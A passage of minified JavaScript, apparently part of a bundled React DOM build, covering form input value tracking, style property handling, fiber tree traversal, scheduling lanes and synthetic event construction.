            set: function(i) {
                r = "" + i,
                s.call(this, i)
            }
        }),
        Object.defineProperty(e, t, {
            enumerable: n.enumerable
        }),
        {
            getValue: function() {
                return r
            },
            setValue: function(i) {
                r = "" + i
            },
            stopTracking: function() {
                e._valueTracker = null,
                delete e[t]
            }
        }
    }
}
function da(e) {
    e._valueTracker || (e._valueTracker = E1(e))
}
function iv(e) {
    if (!e)
        return !1;
    var t = e._valueTracker;
    if (!t)
        return !0;
    var n = t.getValue()
      , r = "";
    return e && (r = sv(e) ? e.checked ? "true" : "false" : e.value),
    e = r,
    e !== n ? (t.setValue(e),
    !0) : !1
}
function Ja(e) {
    if (e = e || (typeof document < "u" ? document : void 0),
    typeof e > "u")
        return null;
    try {
        return e.activeElement || e.body
    } catch {
        return e.body
    }
}
function Cc(e, t) {
    var n = t.checked;
    return Ie({}, t, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n ?? e._wrapperState.initialChecked
    })
}
function kp(e, t) {
    var n = t.defaultValue == null ? "" : t.defaultValue
      , r = t.checked != null ? t.checked : t.defaultChecked;
    n = Cr(t.value != null ? t.value : n),
    e._wrapperState = {
        initialChecked: r,
        initialValue: n,
        controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null
    }
}
function av(e, t) {
    t = t.checked,
    t != null && Bd(e, "checked", t, !1)
}
function kc(e, t) {
    av(e, t);
    var n = Cr(t.value)
      , r = t.type;
    if (n != null)
        r === "number" ? (n === 0 && e.value === "" || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
    else if (r === "submit" || r === "reset") {
        e.removeAttribute("value");
        return
    }
    t.hasOwnProperty("value") ? Tc(e, t.type, n) : t.hasOwnProperty("defaultValue") && Tc(e, t.type, Cr(t.defaultValue)),
    t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked)
}
function Tp(e, t, n) {
    if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
        var r = t.type;
        if (!(r !== "submit" && r !== "reset" || t.value !== void 0 && t.value !== null))
            return;
        t = "" + e._wrapperState.initialValue,
        n || t === e.value || (e.value = t),
        e.defaultValue = t
    }
    n = e.name,
    n !== "" && (e.name = ""),
    e.defaultChecked = !!e._wrapperState.initialChecked,
    n !== "" && (e.name = n)
}
function Tc(e, t, n) {
    (t !== "number" || Ja(e.ownerDocument) !== e) && (n == null ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
}
var Bs = Array.isArray;
function Vo(e, t, n, r) {
    if (e = e.options,
    t) {
        t = {};
        for (var o = 0; o < n.length; o++)
            t["$" + n[o]] = !0;
        for (n = 0; n < e.length; n++)
            o = t.hasOwnProperty("$" + e[n].value),
            e[n].selected !== o && (e[n].selected = o),
            o && r && (e[n].defaultSelected = !0)
    } else {
        for (n = "" + Cr(n),
        t = null,
        o = 0; o < e.length; o++) {
            if (e[o].value === n) {
                e[o].selected = !0,
                r && (e[o].defaultSelected = !0);
                return
            }
            t !== null || e[o].disabled || (t = e[o])
        }
        t !== null && (t.selected = !0)
    }
}
function Pc(e, t) {
    if (t.dangerouslySetInnerHTML != null)
        throw Error(M(91));
    return Ie({}, t, {
        value: void 0,
        defaultValue: void 0,
        children: "" + e._wrapperState.initialValue
    })
}
function Pp(e, t) {
    var n = t.value;
    if (n == null) {
        if (n = t.children,
        t = t.defaultValue,
        n != null) {
            if (t != null)
                throw Error(M(92));
            if (Bs(n)) {
                if (1 < n.length)
                    throw Error(M(93));
                n = n[0]
            }
            t = n
        }
        t == null && (t = ""),
        n = t
    }
    e._wrapperState = {
        initialValue: Cr(n)
    }
}
function lv(e, t) {
    var n = Cr(t.value)
      , r = Cr(t.defaultValue);
    n != null && (n = "" + n,
    n !== e.value && (e.value = n),
    t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)),
    r != null && (e.defaultValue = "" + r)
}
function Np(e) {
    var t = e.textContent;
    t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t)
}
function uv(e) {
    switch (e) {
    case "svg":
        return "http://www.w3.org/2000/svg";
    case "math":
        return "http://www.w3.org/1998/Math/MathML";
    default:
        return "http://www.w3.org/1999/xhtml"
    }
}
function Nc(e, t) {
    return e == null || e === "http://www.w3.org/1999/xhtml" ? uv(t) : e === "http://www.w3.org/2000/svg" && t === "foreignObject" ? "http://www.w3.org/1999/xhtml" : e
}
var fa, cv = function(e) {
    return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction ? function(t, n, r, o) {
        MSApp.execUnsafeLocalFunction(function() {
            return e(t, n, r, o)
        })
    }
    : e
}(function(e, t) {
    if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML"in e)
        e.innerHTML = t;
    else {
        for (fa = fa || document.createElement("div"),
        fa.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>",
        t = fa.firstChild; e.firstChild; )
            e.removeChild(e.firstChild);
        for (; t.firstChild; )
            e.appendChild(t.firstChild)
    }
});
function li(e, t) {
    if (t) {
        var n = e.firstChild;
        if (n && n === e.lastChild && n.nodeType === 3) {
            n.nodeValue = t;
            return
        }
    }
    e.textContent = t
}
var qs = {
    animationIterationCount: !0,
    aspectRatio: !0,
    borderImageOutset: !0,
    borderImageSlice: !0,
    borderImageWidth: !0,
    boxFlex: !0,
    boxFlexGroup: !0,
    boxOrdinalGroup: !0,
    columnCount: !0,
    columns: !0,
    flex: !0,
    flexGrow: !0,
    flexPositive: !0,
    flexShrink: !0,
    flexNegative: !0,
    flexOrder: !0,
    gridArea: !0,
    gridRow: !0,
    gridRowEnd: !0,
    gridRowSpan: !0,
    gridRowStart: !0,
    gridColumn: !0,
    gridColumnEnd: !0,
    gridColumnSpan: !0,
    gridColumnStart: !0,
    fontWeight: !0,
    lineClamp: !0,
    lineHeight: !0,
    opacity: !0,
    order: !0,
    orphans: !0,
    tabSize: !0,
    widows: !0,
    zIndex: !0,
    zoom: !0,
    fillOpacity: !0,
    floodOpacity: !0,
    stopOpacity: !0,
    strokeDasharray: !0,
    strokeDashoffset: !0,
    strokeMiterlimit: !0,
    strokeOpacity: !0,
    strokeWidth: !0
}
  , b1 = ["Webkit", "ms", "Moz", "O"];
Object.keys(qs).forEach(function(e) {
    b1.forEach(function(t) {
        t = t + e.charAt(0).toUpperCase() + e.substring(1),
        qs[t] = qs[e]
    })
});
function dv(e, t, n) {
    return t == null || typeof t == "boolean" || t === "" ? "" : n || typeof t != "number" || t === 0 || qs.hasOwnProperty(e) && qs[e] ? ("" + t).trim() : t + "px"
}
function fv(e, t) {
    e = e.style;
    for (var n in t)
        if (t.hasOwnProperty(n)) {
            var r = n.indexOf("--") === 0
              , o = dv(n, t[n], r);
            n === "float" && (n = "cssFloat"),
            r ? e.setProperty(n, o) : e[n] = o
        }
}
var C1 = Ie({
    menuitem: !0
}, {
    area: !0,
    base: !0,
    br: !0,
    col: !0,
    embed: !0,
    hr: !0,
    img: !0,
    input: !0,
    keygen: !0,
    link: !0,
    meta: !0,
    param: !0,
    source: !0,
    track: !0,
    wbr: !0
});
function Rc(e, t) {
    if (t) {
        if (C1[e] && (t.children != null || t.dangerouslySetInnerHTML != null))
            throw Error(M(137, e));
        if (t.dangerouslySetInnerHTML != null) {
            if (t.children != null)
                throw Error(M(60));
            if (typeof t.dangerouslySetInnerHTML != "object" || !("__html"in t.dangerouslySetInnerHTML))
                throw Error(M(61))
        }
        if (t.style != null && typeof t.style != "object")
            throw Error(M(62))
    }
}
function Ac(e, t) {
    if (e.indexOf("-") === -1)
        return typeof t.is == "string";
    switch (e) {
    case "annotation-xml":
    case "color-profile":
    case "font-face":
    case "font-face-src":
    case "font-face-uri":
    case "font-face-format":
    case "font-face-name":
    case "missing-glyph":
        return !1;
    default:
        return !0
    }
}
var Oc = null;
function Kd(e) {
    return e = e.target || e.srcElement || window,
    e.correspondingUseElement && (e = e.correspondingUseElement),
    e.nodeType === 3 ? e.parentNode : e
}
var jc = null
  , zo = null
  , $o = null;
function Rp(e) {
    if (e = Ji(e)) {
        if (typeof jc != "function")
            throw Error(M(280));
        var t = e.stateNode;
        t && (t = ql(t),
        jc(e.stateNode, e.type, t))
    }
}
function pv(e) {
    zo ? $o ? $o.push(e) : $o = [e] : zo = e
}
function hv() {
    if (zo) {
        var e = zo
          , t = $o;
        if ($o = zo = null,
        Rp(e),
        t)
            for (e = 0; e < t.length; e++)
                Rp(t[e])
    }
}
function mv(e, t) {
    return e(t)
}
function vv() {}
var Ou = !1;
function gv(e, t, n) {
    if (Ou)
        return e(t, n);
    Ou = !0;
    try {
        return mv(e, t, n)
    } finally {
        Ou = !1,
        (zo !== null || $o !== null) && (vv(),
        hv())
    }
}
function ui(e, t) {
    var n = e.stateNode;
    if (n === null)
        return null;
    var r = ql(n);
    if (r === null)
        return null;
    n = r[t];
    e: switch (t) {
    case "onClick":
    case "onClickCapture":
    case "onDoubleClick":
    case "onDoubleClickCapture":
    case "onMouseDown":
    case "onMouseDownCapture":
    case "onMouseMove":
    case "onMouseMoveCapture":
    case "onMouseUp":
    case "onMouseUpCapture":
    case "onMouseEnter":
        (r = !r.disabled) || (e = e.type,
        r = !(e === "button" || e === "input" || e === "select" || e === "textarea")),
        e = !r;
        break e;
    default:
        e = !1
    }
    if (e)
        return null;
    if (n && typeof n != "function")
        throw Error(M(231, t, typeof n));
    return n
}
var Mc = !1;
if (Wn)
    try {
        var Ps = {};
        Object.defineProperty(Ps, "passive", {
            get: function() {
                Mc = !0
            }
        }),
        window.addEventListener("test", Ps, Ps),
        window.removeEventListener("test", Ps, Ps)
    } catch {
        Mc = !1
    }
function k1(e, t, n, r, o, s, i, a, l) {
    var u = Array.prototype.slice.call(arguments, 3);
    try {
        t.apply(n, u)
    } catch (c) {
        this.onError(c)
    }
}
var Gs = !1
  , el = null
  , tl = !1
  , Ic = null
  , T1 = {
    onError: function(e) {
        Gs = !0,
        el = e
    }
};
function P1(e, t, n, r, o, s, i, a, l) {
    Gs = !1,
    el = null,
    k1.apply(T1, arguments)
}
function N1(e, t, n, r, o, s, i, a, l) {
    if (P1.apply(this, arguments),
    Gs) {
        if (Gs) {
            var u = el;
            Gs = !1,
            el = null
        } else
            throw Error(M(198));
        tl || (tl = !0,
        Ic = u)
    }
}
function ho(e) {
    var t = e
      , n = e;
    if (e.alternate)
        for (; t.return; )
            t = t.return;
    else {
        e = t;
        do
            t = e,
            t.flags & 4098 && (n = t.return),
            e = t.return;
        while (e)
    }
    return t.tag === 3 ? n : null
}
function yv(e) {
    if (e.tag === 13) {
        var t = e.memoizedState;
        if (t === null && (e = e.alternate,
        e !== null && (t = e.memoizedState)),
        t !== null)
            return t.dehydrated
    }
    return null
}
function Ap(e) {
    if (ho(e) !== e)
        throw Error(M(188))
}
function R1(e) {
    var t = e.alternate;
    if (!t) {
        if (t = ho(e),
        t === null)
            throw Error(M(188));
        return t !== e ? null : e
    }
    for (var n = e, r = t; ; ) {
        var o = n.return;
        if (o === null)
            break;
        var s = o.alternate;
        if (s === null) {
            if (r = o.return,
            r !== null) {
                n = r;
                continue
            }
            break
        }
        if (o.child === s.child) {
            for (s = o.child; s; ) {
                if (s === n)
                    return Ap(o),
                    e;
                if (s === r)
                    return Ap(o),
                    t;
                s = s.sibling
            }
            throw Error(M(188))
        }
        if (n.return !== r.return)
            n = o,
            r = s;
        else {
            for (var i = !1, a = o.child; a; ) {
                if (a === n) {
                    i = !0,
                    n = o,
                    r = s;
                    break
                }
                if (a === r) {
                    i = !0,
                    r = o,
                    n = s;
                    break
                }
                a = a.sibling
            }
            if (!i) {
                for (a = s.child; a; ) {
                    if (a === n) {
                        i = !0,
                        n = s,
                        r = o;
                        break
                    }
                    if (a === r) {
                        i = !0,
                        r = s,
                        n = o;
                        break
                    }
                    a = a.sibling
                }
                if (!i)
                    throw Error(M(189))
            }
        }
        if (n.alternate !== r)
            throw Error(M(190))
    }
    if (n.tag !== 3)
        throw Error(M(188));
    return n.stateNode.current === n ? e : t
}
function wv(e) {
    return e = R1(e),
    e !== null ? xv(e) : null
}
function xv(e) {
    if (e.tag === 5 || e.tag === 6)
        return e;
    for (e = e.child; e !== null; ) {
        var t = xv(e);
        if (t !== null)
            return t;
        e = e.sibling
    }
    return null
}
var Sv = Dt.unstable_scheduleCallback
  , Op = Dt.unstable_cancelCallback
  , A1 = Dt.unstable_shouldYield
  , O1 = Dt.unstable_requestPaint
  , $e = Dt.unstable_now
  , j1 = Dt.unstable_getCurrentPriorityLevel
  , Qd = Dt.unstable_ImmediatePriority
  , _v = Dt.unstable_UserBlockingPriority
  , nl = Dt.unstable_NormalPriority
  , M1 = Dt.unstable_LowPriority
  , Ev = Dt.unstable_IdlePriority
  , Wl = null
  , Cn = null;
function I1(e) {
    if (Cn && typeof Cn.onCommitFiberRoot == "function")
        try {
            Cn.onCommitFiberRoot(Wl, e, void 0, (e.current.flags & 128) === 128)
        } catch {}
}
var un = Math.clz32 ? Math.clz32 : F1
  , L1 = Math.log
  , D1 = Math.LN2;
function F1(e) {
    return e >>>= 0,
    e === 0 ? 32 : 31 - (L1(e) / D1 | 0) | 0
}
var pa = 64
  , ha = 4194304;
function Hs(e) {
    switch (e & -e) {
    case 1:
        return 1;
    case 2:
        return 2;
    case 4:
        return 4;
    case 8:
        return 8;
    case 16:
        return 16;
    case 32:
        return 32;
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
        return e & 4194240;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
        return e & 130023424;
    case 134217728:
        return 134217728;
    case 268435456:
        return 268435456;
    case 536870912:
        return 536870912;
    case 1073741824:
        return 1073741824;
    default:
        return e
    }
}
function rl(e, t) {
    var n = e.pendingLanes;
    if (n === 0)
        return 0;
    var r = 0
      , o = e.suspendedLanes
      , s = e.pingedLanes
      , i = n & 268435455;
    if (i !== 0) {
        var a = i & ~o;
        a !== 0 ? r = Hs(a) : (s &= i,
        s !== 0 && (r = Hs(s)))
    } else
        i = n & ~o,
        i !== 0 ? r = Hs(i) : s !== 0 && (r = Hs(s));
    if (r === 0)
        return 0;
    if (t !== 0 && t !== r && !(t & o) && (o = r & -r,
    s = t & -t,
    o >= s || o === 16 && (s & 4194240) !== 0))
        return t;
    if (r & 4 && (r |= n & 16),
    t = e.entangledLanes,
    t !== 0)
        for (e = e.entanglements,
        t &= r; 0 < t; )
            n = 31 - un(t),
            o = 1 << n,
            r |= e[n],
            t &= ~o;
    return r
}
function V1(e, t) {
    switch (e) {
    case 1:
    case 2:
    case 4:
        return t + 250;
    case 8:
    case 16:
    case 32:
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
        return t + 5e3;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
        return -1;
    case 134217728:
    case 268435456:
    case 536870912:
    case 1073741824:
        return -1;
    default:
        return -1
    }
}
function z1(e, t) {
    for (var n = e.suspendedLanes, r = e.pingedLanes, o = e.expirationTimes, s = e.pendingLanes; 0 < s; ) {
        var i = 31 - un(s)
          , a = 1 << i
          , l = o[i];
        l === -1 ? (!(a & n) || a & r) && (o[i] = V1(a, t)) : l <= t && (e.expiredLanes |= a),
        s &= ~a
    }
}
function Lc(e) {
    return e = e.pendingLanes & -1073741825,
    e !== 0 ? e : e & 1073741824 ? 1073741824 : 0
}
function bv() {
    var e = pa;
    return pa <<= 1,
    !(pa & 4194240) && (pa = 64),
    e
}
function ju(e) {
    for (var t = [], n = 0; 31 > n; n++)
        t.push(e);
    return t
}
function Yi(e, t, n) {
    e.pendingLanes |= t,
    t !== 536870912 && (e.suspendedLanes = 0,
    e.pingedLanes = 0),
    e = e.eventTimes,
    t = 31 - un(t),
    e[t] = n
}
function $1(e, t) {
    var n = e.pendingLanes & ~t;
    e.pendingLanes = t,
    e.suspendedLanes = 0,
    e.pingedLanes = 0,
    e.expiredLanes &= t,
    e.mutableReadLanes &= t,
    e.entangledLanes &= t,
    t = e.entanglements;
    var r = e.eventTimes;
    for (e = e.expirationTimes; 0 < n; ) {
        var o = 31 - un(n)
          , s = 1 << o;
        t[o] = 0,
        r[o] = -1,
        e[o] = -1,
        n &= ~s
    }
}
function qd(e, t) {
    var n = e.entangledLanes |= t;
    for (e = e.entanglements; n; ) {
        var r = 31 - un(n)
          , o = 1 << r;
        o & t | e[r] & t && (e[r] |= t),
        n &= ~o
    }
}
var Ee = 0;
function Cv(e) {
    return e &= -e,
    1 < e ? 4 < e ? e & 268435455 ? 16 : 536870912 : 4 : 1
}
var kv, Gd, Tv, Pv, Nv, Dc = !1, ma = [], gr = null, yr = null, wr = null, ci = new Map, di = new Map, ir = [], U1 = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");
function jp(e, t) {
    switch (e) {
    case "focusin":
    case "focusout":
        gr = null;
        break;
    case "dragenter":
    case "dragleave":
        yr = null;
        break;
    case "mouseover":
    case "mouseout":
        wr = null;
        break;
    case "pointerover":
    case "pointerout":
        ci.delete(t.pointerId);
        break;
    case "gotpointercapture":
    case "lostpointercapture":
        di.delete(t.pointerId)
    }
}
function Ns(e, t, n, r, o, s) {
    return e === null || e.nativeEvent !== s ? (e = {
        blockedOn: t,
        domEventName: n,
        eventSystemFlags: r,
        nativeEvent: s,
        targetContainers: [o]
    },
    t !== null && (t = Ji(t),
    t !== null && Gd(t)),
    e) : (e.eventSystemFlags |= r,
    t = e.targetContainers,
    o !== null && t.indexOf(o) === -1 && t.push(o),
    e)
}
function B1(e, t, n, r, o) {
    switch (t) {
    case "focusin":
        return gr = Ns(gr, e, t, n, r, o),
        !0;
    case "dragenter":
        return yr = Ns(yr, e, t, n, r, o),
        !0;
    case "mouseover":
        return wr = Ns(wr, e, t, n, r, o),
        !0;
    case "pointerover":
        var s = o.pointerId;
        return ci.set(s, Ns(ci.get(s) || null, e, t, n, r, o)),
        !0;
    case "gotpointercapture":
        return s = o.pointerId,
        di.set(s, Ns(di.get(s) || null, e, t, n, r, o)),
        !0
    }
    return !1
}
function Rv(e) {
    var t = Br(e.target);
    if (t !== null) {
        var n = ho(t);
        if (n !== null) {
            if (t = n.tag,
            t === 13) {
                if (t = yv(n),
                t !== null) {
                    e.blockedOn = t,
                    Nv(e.priority, function() {
                        Tv(n)
                    });
                    return
                }
            } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
                e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
                return
            }
        }
    }
    e.blockedOn = null
}
function La(e) {
    if (e.blockedOn !== null)
        return !1;
    for (var t = e.targetContainers; 0 < t.length; ) {
        var n = Fc(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
        if (n === null) {
            n = e.nativeEvent;
            var r = new n.constructor(n.type,n);
            Oc = r,
            n.target.dispatchEvent(r),
            Oc = null
        } else
            return t = Ji(n),
            t !== null && Gd(t),
            e.blockedOn = n,
            !1;
        t.shift()
    }
    return !0
}
function Mp(e, t, n) {
    La(e) && n.delete(t)
}
function H1() {
    Dc = !1,
    gr !== null && La(gr) && (gr = null),
    yr !== null && La(yr) && (yr = null),
    wr !== null && La(wr) && (wr = null),
    ci.forEach(Mp),
    di.forEach(Mp)
}
function Rs(e, t) {
    e.blockedOn === t && (e.blockedOn = null,
    Dc || (Dc = !0,
    Dt.unstable_scheduleCallback(Dt.unstable_NormalPriority, H1)))
}
function fi(e) {
    function t(o) {
        return Rs(o, e)
    }
    if (0 < ma.length) {
        Rs(ma[0], e);
        for (var n = 1; n < ma.length; n++) {
            var r = ma[n];
            r.blockedOn === e && (r.blockedOn = null)
        }
    }
    for (gr !== null && Rs(gr, e),
    yr !== null && Rs(yr, e),
    wr !== null && Rs(wr, e),
    ci.forEach(t),
    di.forEach(t),
    n = 0; n < ir.length; n++)
        r = ir[n],
        r.blockedOn === e && (r.blockedOn = null);
    for (; 0 < ir.length && (n = ir[0],
    n.blockedOn === null); )
        Rv(n),
        n.blockedOn === null && ir.shift()
}
var Uo = Xn.ReactCurrentBatchConfig
  , ol = !0;
function W1(e, t, n, r) {
    var o = Ee
      , s = Uo.transition;
    Uo.transition = null;
    try {
        Ee = 1,
        Yd(e, t, n, r)
    } finally {
        Ee = o,
        Uo.transition = s
    }
}
function Z1(e, t, n, r) {
    var o = Ee
      , s = Uo.transition;
    Uo.transition = null;
    try {
        Ee = 4,
        Yd(e, t, n, r)
    } finally {
        Ee = o,
        Uo.transition = s
    }
}
function Yd(e, t, n, r) {
    if (ol) {
        var o = Fc(e, t, n, r);
        if (o === null)
            Bu(e, t, r, sl, n),
            jp(e, r);
        else if (B1(o, e, t, n, r))
            r.stopPropagation();
        else if (jp(e, r),
        t & 4 && -1 < U1.indexOf(e)) {
            for (; o !== null; ) {
                var s = Ji(o);
                if (s !== null && kv(s),
                s = Fc(e, t, n, r),
                s === null && Bu(e, t, r, sl, n),
                s === o)
                    break;
                o = s
            }
            o !== null && r.stopPropagation()
        } else
            Bu(e, t, r, null, n)
    }
}
var sl = null;
function Fc(e, t, n, r) {
    if (sl = null,
    e = Kd(r),
    e = Br(e),
    e !== null)
        if (t = ho(e),
        t === null)
            e = null;
        else if (n = t.tag,
        n === 13) {
            if (e = yv(t),
            e !== null)
                return e;
            e = null
        } else if (n === 3) {
            if (t.stateNode.current.memoizedState.isDehydrated)
                return t.tag === 3 ? t.stateNode.containerInfo : null;
            e = null
        } else
            t !== e && (e = null);
    return sl = e,
    null
}
function Av(e) {
    switch (e) {
    case "cancel":
    case "click":
    case "close":
    case "contextmenu":
    case "copy":
    case "cut":
    case "auxclick":
    case "dblclick":
    case "dragend":
    case "dragstart":
    case "drop":
    case "focusin":
    case "focusout":
    case "input":
    case "invalid":
    case "keydown":
    case "keypress":
    case "keyup":
    case "mousedown":
    case "mouseup":
    case "paste":
    case "pause":
    case "play":
    case "pointercancel":
    case "pointerdown":
    case "pointerup":
    case "ratechange":
    case "reset":
    case "resize":
    case "seeked":
    case "submit":
    case "touchcancel":
    case "touchend":
    case "touchstart":
    case "volumechange":
    case "change":
    case "selectionchange":
    case "textInput":
    case "compositionstart":
    case "compositionend":
    case "compositionupdate":
    case "beforeblur":
    case "afterblur":
    case "beforeinput":
    case "blur":
    case "fullscreenchange":
    case "focus":
    case "hashchange":
    case "popstate":
    case "select":
    case "selectstart":
        return 1;
    case "drag":
    case "dragenter":
    case "dragexit":
    case "dragleave":
    case "dragover":
    case "mousemove":
    case "mouseout":
    case "mouseover":
    case "pointermove":
    case "pointerout":
    case "pointerover":
    case "scroll":
    case "toggle":
    case "touchmove":
    case "wheel":
    case "mouseenter":
    case "mouseleave":
    case "pointerenter":
    case "pointerleave":
        return 4;
    case "message":
        switch (j1()) {
        case Qd:
            return 1;
        case _v:
            return 4;
        case nl:
        case M1:
            return 16;
        case Ev:
            return 536870912;
        default:
            return 16
        }
    default:
        return 16
    }
}
var mr = null
  , Xd = null
  , Da = null;
function Ov() {
    if (Da)
        return Da;
    var e, t = Xd, n = t.length, r, o = "value"in mr ? mr.value : mr.textContent, s = o.length;
    for (e = 0; e < n && t[e] === o[e]; e++)
        ;
    var i = n - e;
    for (r = 1; r <= i && t[n - r] === o[s - r]; r++)
        ;
    return Da = o.slice(e, 1 < r ? 1 - r : void 0)
}
function Fa(e) {
    var t = e.keyCode;
    return "charCode"in e ? (e = e.charCode,
    e === 0 && t === 13 && (e = 13)) : e = t,
    e === 10 && (e = 13),
    32 <= e || e === 13 ? e : 0
}
function va() {
    return !0
}
function Ip() {
    return !1
}
function zt(e) {
    function t(n, r, o, s, i) {
        this._reactName = n,
        this._targetInst = o,
        this.type = r,
        this.nativeEvent = s,
        this.target = i,
        this.currentTarget = null;
        for (var a in e)
            e.hasOwnProperty(a) && (n = e[a],
            this[a] = n ? n(s) : s[a]);
        return this.isDefaultPrevented = (s.defaultPrevented != null ? s.defaultPrevented : s.returnValue === !1) ? va : Ip,
        this.isPropagationStopped = Ip,
        this
    }
    return Ie(t.prototype, {
        preventDefault: function() {
            this.defaultPrevented = !0;
            var n = this.nativeEvent;
            n && (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = !1),
            this.isDefaultPrevented = va)
        },
        stopPropagation: function() {
            var n = this.nativeEvent;
            n && (n.stopPropagation ? n.stopPropagation() : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0),
            this.isPropagationStopped = va)
        },
        persist: function() {},
        isPersistent: va
    }),
    t
}
var xs = {
    eventPhase: 0,
    bubbles: 0,
    cancelable: 0,
    timeStamp: function(e) {
        return e.timeStamp || Date.now()
    },
    defaultPrevented: 0,
    isTrusted: 0
}, Jd = zt(xs), Xi = Ie({}, xs, {
    view: 0,
    detail: 0
}), K1 = zt(Xi), Mu, Iu, As, Zl = Ie({}, Xi, {
    screenX: 0,
    screenY: 0,
    clientX: 0,
    clientY: 0,
    pageX: 0,
    pageY: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    getModifierState: ef,
    button: 0,
    buttons: 0,
    relatedTarget: function(e) {
        return e.relatedTarget === void 0 ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
    },
    movementX: function(e) {
        return "movementX"in e ? e.movementX : (e !== As && (As && e.type === "mousemove" ? (Mu = e.screenX - As.screenX,
        Iu = e.screenY - As.screenY) : Iu = Mu = 0,
        As = e),
        Mu)
    },
    movementY: function(e) {
        return "movementY"in e ? e.movementY : Iu
    }
}), Lp = zt(Zl), Q1 = Ie({}, Zl, {
    dataTransfer: 0
}), q1 = zt(Q1), G1 = Ie({}, Xi, {
    relatedTarget: 0
}), Lu = zt(G1), Y1 = Ie({}, xs, {
    animationName: 0,
    elapsedTime: 0,
    pseudoElement: 0
}), X1 = zt(Y1), J1 = Ie({}, xs, {
    clipboardData: function(e) {
        return "clipboardData"in e ? e.clipboardData : window.clipboardData
    }
}), eS = zt(J1), tS = Ie({}, xs, {
    data: 0
}), Dp = zt(tS), nS = {
    Esc: "Escape",
    Spacebar: " ",
    Left: "ArrowLeft",
    Up: "ArrowUp",
    Right: "ArrowRight",
    Down: "ArrowDown",
    Del: "Delete",
    Win: "OS",
    Menu: "ContextMenu",
    Apps: "ContextMenu",
    Scroll: "ScrollLock",
    MozPrintableKey: "Unidentified"
}, rS = {
    8: "Backspace",
    9: "Tab",
    12: "Clear",
    13: "Enter",
    16: "Shift",
    17: "Control",
    18: "Alt",
    19: "Pause",
    20: "CapsLock",
    27: "Escape",
    32: " ",
    33: "PageUp",
    34: "PageDown",
    35: "End",
    36: "Home",
    37: "ArrowLeft",
    38: "ArrowUp",
    39: "ArrowRight",
    40: "ArrowDown",
    45: "Insert",
    46: "Delete",
    112: "F1",
    113: "F2",
    114: "F3",
    115: "F4",
    116: "F5",
    117: "F6",
    118: "F7",
    119: "F8",
    120: "F9",
    121: "F10",
    122: "F11",
    123: "F12",
    144: "NumLock",
    145: "ScrollLock",
    224: "Meta"
}, oS = {
    Alt: "altKey",
    Control: "ctrlKey",
    Meta: "metaKey",
    Shift: "shiftKey"
};
function sS(e) {
    var t = this.nativeEvent;
    return t.getModifierState ? t.getModifierState(e) : (e = oS[e]) ? !!t[e] : !1
}
function ef() {
    return sS
}
var iS = Ie({}, Xi, {
    key: function(e) {
        if (e.key) {
            var t = nS[e.key] || e.key;
            if (t !== "Unidentified")
                return t
        }
        return e.type === "keypress" ? (e = Fa(e),
        e === 13 ? "Enter" : String.fromCharCode(e)) : e.type === "keydown" || e.type === "keyup" ? rS[e.keyCode] || "Unidentified" : ""
    },
    code: 0,
    location: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    repeat: 0,
    locale: 0,
    getModifierState: ef,
    charCode: function(e) {
        return e.type === "keypress" ? Fa(e) : 0
    },
    keyCode: function(e) {
        return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
    },
    which: function(e) {
        return e.type === "keypress" ? Fa(e) : e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
    }
})
  , aS = zt(iS)
  , lS = Ie({}, Zl, {
    pointerId: 0,
    width: 0,
    height: 0,
    pressure: 0,
    tangentialPressure: 0,
    tiltX: 0,
    tiltY: 0,
    twist: 0,
    pointerType: 0,
    isPrimary: 0
})
  , Fp = zt(lS)
  , uS = Ie({}, Xi, {
    touches: 0,
    targetTouches: 0,
    changedTouches: 0,
    altKey: 0,
    metaKey: 0,
    ctrlKey: 0,
    shiftKey: 0,
    getModifierState: ef
})
  , cS = zt(uS)
  , dS = Ie({}, xs, {
    propertyName: 0,
    elapsedTime: 0,
    pseudoElement: 0
})
  , fS = zt(dS)
  , pS = Ie({}, Zl, {
    deltaX: function(e) {
        return "deltaX"in e ? e.deltaX : "wheelDeltaX"in e ? -e.wheelDeltaX : 0
    },
    deltaY: function(e) {
        return "deltaY"in e ? e.deltaY : "wheelDeltaY"in e ? -e.wheelDeltaY : "wheelDelta"in e ? -e.wheelDelta : 0
    },
    deltaZ: 0,
    deltaMode: 0
})
  , hS = zt(pS)
  , mS = [9, 13, 27, 32]
  , tf = Wn && "CompositionEvent"in window
  , Ys = null;
Wn && "documentMode"in document && (Ys = document.documentMode);
var vS = Wn && "TextEvent"in window && !Ys
  , jv = Wn && (!tf || Ys && 8 < Ys && 11 >= Ys)
